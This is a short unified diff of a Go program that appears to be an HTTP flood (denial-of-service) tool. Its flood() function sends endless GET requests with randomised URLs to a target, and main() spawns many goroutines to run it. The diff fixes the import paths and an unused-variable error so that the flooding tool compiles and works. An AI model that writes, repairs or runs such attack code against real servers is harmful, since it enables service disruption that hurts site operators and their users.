@@ -4,8 +4,8 @@ import (
     "os"
     "strconv"
     "regexp"
-    "http"
-    "rand"
+    "net/http"
+    "math/rand"
     "fmt"
 )
 
@@ -14,7 +14,7 @@ func flood(target string) {
 
     for {
         url := fmt.Sprintf(target, rand.Intn(9999999) + 100)
-        resp, err := http.Get(url)
+        http.Get(url)
         fmt.Println(url)
     }
 }
@@ -71,7 +71,7 @@ func main() {
         if err != nil {
             errno(4)
         }
-
+        
         // Create threads
         for i := 0; i < threads; i++ {
             go flood(target)
